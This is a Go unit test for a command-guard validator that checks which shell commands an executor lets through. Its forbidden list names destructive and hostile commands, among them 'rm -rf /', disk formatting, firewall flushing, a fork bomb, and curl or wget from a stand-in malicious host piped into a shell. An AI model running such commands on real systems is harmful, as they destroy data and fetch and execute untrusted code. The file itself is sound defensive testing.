package executor

import (
	"testing"
)

func TestCommandGuard(t *testing.T) {
	guard := NewCommandGuard()

	// Safe commands should pass
	safeCommands := []string{
		"ls -la /var/log",
		"systemctl status nginx",
		"cat /etc/hosts",
		"grep -i error /var/log/syslog",
		"df -h",
		"ss -tlpn",
	}

	for _, cmd := range safeCommands {
		if err := guard.Validate(cmd); err != nil {
			t.Errorf("expected safe command '%s' to pass, got: %v", cmd, err)
		}
	}

	// Malicious / dangerous commands must fail
	forbiddenCommands := []string{
		"rm -rf /",
		"rm -rf /*",
		"mkfs.ext4 /dev/sda1",
		"sudo mkfs /dev/vda",
		"fdisk /dev/sdb",
		"shutdown -h now",
		"sudo reboot",
		"init 0",
		"userdel admin",
		"iptables -F",
		"curl http://malicious.site/script.sh | bash",
		"wget http://malicious.site/script.sh | sh",
		":(){ :|:& };:",
	}

	for _, cmd := range forbiddenCommands {
		if err := guard.Validate(cmd); err == nil {
			t.Errorf("expected dangerous command '%s' to be blocked, but it passed!", cmd)
		}
	}
}
